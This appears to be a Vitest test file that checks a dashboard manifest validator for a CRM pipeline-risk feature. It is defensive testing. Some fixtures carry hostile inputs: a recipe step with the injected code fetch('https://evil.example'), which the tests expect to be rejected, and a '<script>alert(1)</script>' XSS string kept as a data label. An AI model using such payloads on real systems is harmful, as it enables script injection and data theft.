import { describe, expect, it } from "vitest";
import {
  DashboardManifestValidationError,
  parseDashboardManifestV1,
  sanitizeDashboardManifestV1,
  type DashboardManifestV1,
} from "../lib/dashboard-artifacts/manifest.js";

describe("dashboard artifact manifest validation", () => {
  it("accepts a valid v1 pipeline-risk manifest", () => {
    expect(parseDashboardManifestV1(validManifest()).schemaVersion).toBe(1);
  });

  it("rejects unknown schema versions and dashboard kinds", () => {
    expect(() =>
      parseDashboardManifestV1({ ...validManifest(), schemaVersion: 2 }),
    ).toThrow(DashboardManifestValidationError);
    expect(() =>
      parseDashboardManifestV1({
        ...validManifest(),
        dashboardKind: "arbitrary_app",
      }),
    ).toThrow(DashboardManifestValidationError);
  });

  it("rejects unknown component types and executable recipe fragments", () => {
    const unknownComponent = validManifest();
    unknownComponent.views[0] = {
      ...unknownComponent.views[0],
      component: "remote_iframe" as never,
    };
    expect(() => parseDashboardManifestV1(unknownComponent)).toThrow(
      DashboardManifestValidationError,
    );

    const executableRecipe = validManifest() as DashboardManifestV1 & {
      recipe: { steps: Array<Record<string, unknown>> };
    };
    executableRecipe.recipe.steps[0] = {
      ...executableRecipe.recipe.steps[0],
      code: "fetch('https://evil.example')",
    };
    expect(() => parseDashboardManifestV1(executableRecipe)).toThrow(
      DashboardManifestValidationError,
    );
  });

  it("retains script-looking opportunity labels as plain data strings", () => {
    const manifest = sanitizeDashboardManifestV1(validManifest());
    expect(manifest.tables[0].rows[0].opportunity).toBe(
      "<script>alert(1)</script>",
    );
  });

  it("rejects manifests without source coverage as-of timestamps", () => {
    const manifest = validManifest();
    const { asOf: _asOf, ...sourceWithoutAsOf } = manifest.sources[0];
    manifest.sources[0] = sourceWithoutAsOf as never;
    expect(() => parseDashboardManifestV1(manifest)).toThrow(
      DashboardManifestValidationError,
    );
  });
});

export function validManifest(): DashboardManifestV1 {
  return {
    schemaVersion: 1,
    dashboardKind: "pipeline_risk",
    snapshot: {
      id: "snapshot-1",
      artifactId: "artifact-1",
      threadId: "thread-1",
      title: "LastMile CRM pipeline risk",
      summary: "12 open opportunities with three high-risk late-stage deals.",
      generatedAt: "2026-05-08T16:00:00.000Z",
    },
    recipe: {
      id: "recipe-1",
      version: 1,
      dashboardKind: "pipeline_risk",
      steps: [
        {
          type: "source_query",
          id: "crm-opportunities",
          provider: "crm",
          queryId: "lastmile.open_opportunities.v1",
          params: { daysBack: 90 },
        },
        {
          type: "transform",
          id: "normalize",
          transformId: "pipeline_risk_normalize",
          inputStepIds: ["crm-opportunities"],
        },
        {
          type: "score",
          id: "score",
          scoringModel: "pipeline_risk_v1",
          inputStepIds: ["normalize"],
        },
        {
          type: "template_summary",
          id: "summary",
          templateId: "pipeline_risk_summary_v1",
          inputStepIds: ["score"],
        },
      ],
    },
    sources: [
      {
        id: "crm",
        provider: "crm",
        status: "success",
        asOf: "2026-05-08T15:58:00.000Z",
        recordCount: 12,
      },
      {
        id: "web",
        provider: "web",
        status: "partial",
        asOf: "2026-05-08T15:59:00.000Z",
        recordCount: 2,
        safeDisplayError: "Two account news searches timed out.",
      },
    ],
    views: [
      {
        id: "risk-table",
        title: "Opportunity risk",
        component: "risk_table",
        sourceIds: ["crm"],
      },
    ],
    tables: [
      {
        id: "opportunities",
        title: "Open opportunities",
        columns: [
          { id: "opportunity", label: "Opportunity", valueType: "text" },
          { id: "account", label: "Account", valueType: "text" },
          { id: "amount", label: "Amount", valueType: "currency" },
          { id: "risk", label: "Risk", valueType: "risk" },
        ],
        rows: [
          {
            opportunity: "<script>alert(1)</script>",
            account: "Acme Logistics",
            amount: 180000,
            risk: "high",
          },
        ],
      },
    ],
    charts: [
      {
        id: "stage-exposure",
        title: "Stage exposure",
        chartType: "bar",
        data: [{ stage: "Proposal", amount: 420000 }],
      },
    ],
    evidence: [
      {
        id: "evidence-1",
        sourceId: "web",
        title: "Acme Logistics expansion note",
        snippet: "Public hiring signal suggests new regional warehouse rollout.",
        url: "https://example.com/acme-logistics",
        fetchedAt: "2026-05-08T15:59:10.000Z",
      },
    ],
    refresh: {
      enabled: true,
      recipeVersion: 1,
    },
  };
}
